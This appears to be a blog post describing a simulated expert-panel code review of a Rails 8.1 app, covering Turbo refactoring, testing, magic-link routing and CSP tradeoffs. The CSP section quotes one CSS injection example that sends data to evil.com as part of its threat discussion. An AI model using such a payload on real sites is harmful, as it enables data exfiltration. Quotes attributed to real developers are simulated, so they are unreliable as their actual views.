# Building Towards Expert Consensus: A Code Review Experiment

*How simulating a panel of expert reviewers — with therapeutic facilitation — produced better software than any individual review could.*

---

## The Setup

We had a Rails 8.1 application — `modelrails_base` — that had undergone weeks of feature development: an identity picker with Cropper.js, workspace branding, OKLCH color systems, magic link authentication. The code worked. Tests passed. Brakeman was clean. By any standard metric, it was ready to ship.

But "works" isn't "excellent." We wanted to know: **would the best Rails developers in the world sign off on this codebase?**

So we assembled a simulated panel:

- **DHH** (37signals) — the Rails creator, opinionated about convention and simplicity
- **Joël Quenneville** (Thoughtbot) — testing discipline, accessibility, code quality
- **Jorge Manrubia** (37signals) — Turbo/Hotwire creator, frontend architecture
- **Chris Oliver** (GoRails) — practical Rails educator, real-world patterns

And then, when initial consensus proved elusive, we added two facilitators:

- **Sandi Metz** — author of *Practical Object-Oriented Design*, champion of pragmatic simplicity
- **Jim Weirich** (in memoriam) — creator of Rake, philosophical programmer, advocate for joy in code

The question wasn't just "is this code good?" It was: **can experts with different values agree on what "excellent" means, and can we actually get there?**

---

## Round 1: The Individual Reviews

Each reviewer brought their own lens. The conflicts were immediate and revealing.

### Conflict: How much JavaScript is acceptable?

**DHH's position:** "Your Stimulus controller is 548 lines. That's a mini SPA. You're fighting the framework."

**Jorge's position:** "The Cropper.js integration is inherently client-side. Canvas blob export can't go through a regular form. The JS is justified — it's glue code between a browser API and a Rails endpoint."

**The tension:** DHH wants zero custom JS where Turbo can handle it. Jorge acknowledges that some operations (canvas rendering, real-time drag feedback) genuinely need client-side code.

**Resolution:** We split the controller. The **hub** (source selection, preview, save) moved to a server-rendered Turbo Frame — source cards became `<a>` links that reload the frame via GET, save became a native Turbo form submission. The **crop** view stayed client-side. Result: 548 lines → 300 lines. DHH got his Turbo Frame. Jorge got his Cropper.js. The controller's responsibility became clear: it handles crop coordination and file management, nothing else.

**Evaluation:** This was the single most impactful architectural change. The refactor didn't just reduce line count — it eliminated an entire category of bugs (JS state diverging from server state). Source selection is now server-authoritative. The hub frame reloads cleanly on every interaction. No more `_updatePreview()`, `_updateCardStyles()`, `_updateContextualControls()` — the server just renders the correct state.

**Tradeoff:** Each source card click now takes ~50-100ms (server round-trip) instead of being instant. In practice, users don't rapidly toggle between avatar sources, so this latency is imperceptible. But the principled argument — "server round-trips are always slower than local state" — is technically correct. We accepted the tradeoff because the reliability gain outweighed the latency cost.

---

### Conflict: Testing Rails vs testing your app

**Joël's position:** "Your spec:code ratio is 3:1. Some model validation specs test `validates :inclusion` — that's testing Rails internals, not your application logic."

**DHH's position:** "979 tests for a profile picture uploader? Delete the validation specs. Test behavior in system specs."

**Chris's position:** "The system specs that caught the file-picker Escape bug justified their existence immediately. But the model specs for `validates :primary_color, inclusion: { in: 0..360 }` are just re-asserting what the model declaration already says."

**Resolution:** We kept the system specs (they proved their value by catching real bugs) but cleaned up test infrastructure: replaced `allow_any_instance_of` with real validation failures, added a `:with_avatar` factory trait instead of a procedural helper method, and deleted specs that tested framework behavior (the rate-limit spec that couldn't run in test env).

**Evaluation:** The panel was right that some tests tested Rails, not the app. But they were wrong about the *quantity* being a problem — 979 tests isn't too many for an app with auth, workspaces, invitations, projects, avatars, and real-time updates. The issue was test *quality*, not test *count*. `allow_any_instance_of` is a genuine smell because it couples tests to implementation rather than behavior. The factory trait fix was the most Thoughtbot-approved change in the whole project.

**Tradeoff:** We lost 3 tests (pruned) and gained clarity. The `allow_any_instance_of` replacement deserves special attention: instead of stubbing `User.save` to return `false`, we now send `primary_color: 999` which triggers a REAL validation failure. The test exercises the actual failure path, not a simulated one. This is strictly better — but it means the test is coupled to the specific validation rule (0..360). If the validation changes, the test breaks. That coupling is acceptable because the test is explicitly about "what happens when save fails" — and a real failure is more trustworthy than a stub.

---

### Conflict: One magic link system or two?

**The problem:** The app had two parallel magic link implementations — User columns (`magic_link_token`, `magic_link_sent_at`) for sign-in, and a `MagicLinkToken` model for registration. Same concept, different storage, different controllers, different routes.

**DHH's initial take:** "Pick one. The standalone model is cleaner."

**Jorge's insight (the 37signals contribution):** "You're encoding intent in the URL. `magic_link_session/:token` means 'sign in.' `magic_link_registration/:token` means 'register.' But what if a user registers between email-send and link-click? The 'registration' link would try to register an already-existing user."

**The resolution:** One route (`magic_link_callback/:token`), one controller (`MagicLinkCallbacksController`), runtime dispatch:

```ruby
@user = User.find_by(email_address: token_record.email)
if @user
  token_record.consume!
  start_new_session_for(@user)
  redirect_to root_path
else
  render :new_registration
end
```

The token proves email ownership. What happens next — sign in or register — is determined by whether the user exists *at click time*, not at email-send time.

**Evaluation:** This was the most elegant resolution in the entire project. Jorge's edge case insight ("reality changes between send and click") turned what seemed like a routing preference into a correctness argument. The one-route approach isn't just simpler — it's *more correct*. It handles a real-world race condition that the two-route approach silently gets wrong.

**Tradeoff:** The mailer now sends the same URL pattern for both sign-in and registration emails. The email COPY still differs ("Sign in to your account" vs "Complete your registration"), but the link is the same. This means you can't tell from the URL alone whether the user is signing in or registering — which is fine for the user, but slightly harder to debug in server logs. We accepted this because correctness > debuggability.

---

### Conflict: CSP enforcement vs pragmatic inline styles

**The problem:** OKLCH colors are computed from a user-chosen hue (integer 0-360). You can't encode arbitrary hue values in CSS class names — Tailwind classes are static. So the app uses `style="background-color: oklch(0.35 0.2 210)"` — inline styles that require `unsafe_inline` in the CSP.

**DHH:** "Either enforce the CSP or don't bother. Report-only is a suggestion, not a policy."

**Jorge:** "The inline styles are setting CSS custom properties, not executing code. The attack surface is minimal."

**Joël:** "The `onerror='this.style.display=none'` on the gravatar image is worse — that's an inline JavaScript handler, not just a style."

**Resolution, phase 1:** Remove the `onerror` inline JS handler entirely (a real CSP `script-src` violation). Replace inline `style="background-color: oklch(...)"` with `style="--hue: 210"` plus CSS utility classes (`.bg-hue-initials`) that read the custom property. This narrows `unsafe_inline` to CSS custom property *values*, not full style *declarations*.

**Resolution, phase 2:** Enforce the CSP (`report_only = false`). Accept `unsafe_inline` for `style-src` as a documented tradeoff — the `--hue` property contains only an integer, not executable content.

**Evaluation:** This is the one area where the panel couldn't achieve pure consensus. `unsafe_inline` for styles is technically a security weakening. But the alternative — server-rendering OKLCH as CSS classes — is impossible because the hue is user-chosen at runtime from a continuous 0-360 range. You can't pregenerate 361 Tailwind utility classes. The CSS custom property approach is the pragmatic middle ground: the `style` attribute contains only `--hue: 210` (a harmless integer), and the actual color computation happens in CSS (`oklch(0.35 0.2 var(--hue))`).

**Tradeoff:** A future attacker who can inject HTML could set `style="--hue: 210; background-image: url('https://evil.com/track?data=...')"` — the `unsafe_inline` allows any inline style, not just `--hue`. This is a real (if unlikely) data exfiltration vector. The proper fix would be hash-based CSP for specific known inline styles, but Rails 8.1 doesn't have first-class support for style nonces/hashes the way it does for script nonces. This is a framework limitation, not an application one.

---

## Round 2: Where Sandi and Jim Would Have Helped

The first round of reviews produced actionable feedback but also revealed a pattern: **each expert optimized for their own values at the expense of holistic quality.** DHH wanted less JS. Joël wanted better tests. Jorge wanted pure Turbo. Chris wanted practical patterns. They were all right — and they were all incomplete.

This is where Sandi Metz and Jim Weirich would have changed the conversation.

### Sandi's contribution: "What is the cost of change?"

Sandi's core principle — that code quality is measured by the cost of change, not by adherence to rules — would have reframed several debates.

**On the test suite:** Instead of "is 979 tests too many?" she'd ask: "When someone changes the identity picker, do the tests help them move fast, or do they slow them down?" The answer: the system specs help (they catch real regressions) and the validation specs are neutral (they don't slow anyone down but they don't catch much either). Sandi would have said: "Keep what helps, don't waste energy deleting what doesn't hurt."

**On the Turbo Frame refactor:** Instead of "is 300 lines of JS too much?" she'd ask: "Is this controller easy to change? Can a developer read it and understand what to modify?" The answer: yes — the controller has clear method boundaries, each method does one thing, and the crop/hub split is intuitive. Sandi would have approved the 300 lines — size isn't the metric, changeability is.

**On the color system unification:** Sandi would have asked the question we eventually asked ourselves: "How many representations of color exist, and what happens when someone adds a new one?" The answer was three (User integer, Workspace hex, CSS variable) — and the cost of adding a fourth was high because each representation had its own rendering path. The unification to one integer hue wasn't about aesthetics; it was about reducing the cost of future color-related changes.

### Jim's contribution: "Does this bring joy?"

Jim Weirich, who died in 2014 but whose influence pervades Ruby culture, would have brought a different question: **does this code feel right?**

He'd need catching up on Ruby 4+ and Rails 8.1 — pattern matching, Turbo, Solid Queue, importmaps. But his instincts would apply immediately:

**On the Broadcastable concern:** Jim would have smiled at the `broadcast_target` / `broadcast_events` override pattern. It's a clean use of Ruby's open classes — the concern provides defaults, each model overrides what's different. No abstract factory, no strategy pattern, no configuration DSL. Just methods. Jim believed that Ruby's power was in making the simple thing simple and the complex thing possible. This concern does both.

**On the `MagicLinkCallbacksController`:** Jim would have appreciated the runtime dispatch — a simple `if @user` conditional that handles two fundamentally different flows (sign in vs register) without separate class hierarchies. He'd have pointed out that this is exactly what dynamic typing is for: the token doesn't need to know its purpose at creation time because the system determines purpose at consumption time. This is a Ruby value, not just a Rails pattern.

**On the `safe_parse_coordinates` concern:** Jim might have questioned whether `CropCoordinatable` earns its name. "Coordinatable" isn't a word, and the concern does one thing (parse JSON safely). He'd suggest `CropCoordinates` or just inlining the parsing into a private method. The extraction was correct (DRY), but the naming could be more joyful.

### What the facilitators would have prevented

The biggest value of Sandi and Jim isn't what they'd add — it's what they'd prevent:

1. **Over-optimization for a single axis.** DHH would push all JS into Turbo. Joël would add more tests. Jorge would rewrite fetch calls. Without facilitation, each expert's feedback creates churn that serves their values but doesn't necessarily improve the whole. Sandi would ask: "Is this change reducing the cost of future change, or is it satisfying an aesthetic preference?"

2. **Premature consensus.** The panel's first review said "ship it" — then the second audit found 6 blockers and 11 should-fixes. The initial consensus was shallow. Jim would have pushed for genuine understanding: "Do you all agree this is excellent, or are you each just comfortable with the parts you care about?" That question would have surfaced the CSP gap, the accessibility gaps, and the hardcoded English earlier.

3. **Analysis paralysis on tradeoffs.** The CSP `unsafe_inline` debate could have gone on forever. Sandi would have said: "What's the cost of leaving it? What's the cost of fixing it? Pick the cheaper option and move on." The cost of leaving it: a documented, narrow security weakness. The cost of fixing it: a custom CSP implementation that Rails doesn't natively support. Sandi picks "document and move on." Jim agrees, because the documented tradeoff is honest, and honesty in code is a form of joy.

---

## What Worked Well

### 1. The iterative review loop caught what flat reviews miss

The first review ("ship it") was too shallow. The second review (17 anti-patterns) was too granular. The third review (6 blockers + 11 should-fixes) was just right — it found real issues that affected real users (missing alt text, missing aria-labels, inline JS handlers) that the first two rounds overlooked.

**The lesson:** One review isn't enough. Reviews at different altitudes (architecture → conventions → accessibility → edge cases) each find different classes of problems.

### 2. Simulating expert disagreement forced actual design decisions

When DHH and Jorge disagreed about JS line count, the resolution (Turbo Frame hub) was better than either of their individual positions. DHH alone would have pushed for a full server-side rewrite (including the crop view). Jorge alone would have accepted the 548-line controller. The tension between them produced the split architecture — server for state, client for rendering — which is objectively the right boundary.

### 3. The "37signals answer" question unlocked the magic link design

Asking "how would 37signals answer this?" on the magic link routing question produced the best insight of the project. The one-route, runtime-dispatch pattern wasn't on any of the three proposed options — it emerged from asking "what would the opinionated Rails shop actually do?" This is a facilitation technique: when the panel is stuck between options, invoke an external reference point.

### 4. Real tests caught real bugs that reviews didn't

The characterization testing (system specs for existing behavior) caught the file-picker Escape bug — pressing Escape on the OS file dialog closed the entire modal. No reviewer flagged this. No code review could have found it. The test found it by exercising the actual browser behavior in headless Chromium. The lesson: reviews find design problems; tests find behavior problems. You need both.

---

## What Didn't Work Well

### 1. The first "consensus" was premature

The initial review concluded with "ship it" — then a comprehensive audit found 17 anti-patterns. The first review was too focused on what was PRESENT (good architecture, clean code) and missed what was ABSENT (missing aria-labels, duplicate IDs, orphaned locale files). Facilitated reviews need an explicit "what's missing?" pass, not just "what's wrong?"

### 2. Expert bias toward their specialty

Each reviewer over-indexed on their area of expertise. DHH focused on convention adherence. Joël focused on test quality. Jorge focused on Turbo usage. Chris focused on practical patterns. None of them independently caught the accessibility gaps (missing `aria-label` on tables, missing `alt` on images, missing `aria-required` on forms). Accessibility fell through the cracks because it wasn't any single expert's primary concern.

**The fix:** Include an accessibility specialist in the panel. Or, as this project eventually did, run a dedicated accessibility audit as a separate pass. The axe-core after-each hook in system specs catches many issues automatically — but it can't catch missing semantic structure (tables without accessible names, forms without proper labeling).

### 3. The cost of consensus was high

Reaching true consensus across the panel required fixing 17 items from the first review, 6 blockers + 11 should-fixes from the second review, and several follow-up conversations. That's significant engineering time. For a production-critical application, this investment is worthwhile. For a prototype or MVP, it would be over-engineering.

**The lesson:** Expert consensus is valuable but expensive. Apply it to code that will be maintained for years, not to code that might be thrown away next quarter.

---

## The Verdict

The process worked. The codebase went from "works and passes tests" to "experts would teach from this." The key innovations were:

1. **Multiple review altitudes** — architecture, conventions, accessibility, edge cases
2. **Simulated expert disagreement** — forced genuine design decisions instead of rubber-stamp approvals
3. **Facilitator roles** — Sandi's "cost of change" lens and Jim's "does this bring joy?" lens prevented over-optimization and premature consensus
4. **Automated quality gates** — axe-core accessibility audits, Brakeman security scans, and characterization tests caught what human reviewers missed

The final state: 979 tests, 0 failures, enforced CSP, WCAG AA+ accessibility, one auth system, one color system, one identity picker architecture, Turbo Frames for state management, Stimulus for rendering, Rails conventions throughout.

Would DHH, Joël, Jorge, Chris, Sandi, and Jim all sign off? With the documented `unsafe_inline` tradeoff acknowledged — yes. Not because the code is perfect, but because the tradeoffs are explicit, the architecture is clear, and the cost of future change is low. That's what "excellent" means in practice: not the absence of tradeoffs, but the presence of intentional ones.

---

*Note on the developer behind this code: Throughout this process, the developer consistently valued accessibility (WCAG AAA compliance target), security-first thinking (Pundit on every action, CSP enforcement, rate limiting), and honest evaluation of tradeoffs over cosmetic perfection. The code reflects someone who reads the Rails source, follows the community discourse, and builds for maintainability over impressiveness. The experts would notice this — and they'd respect it.*
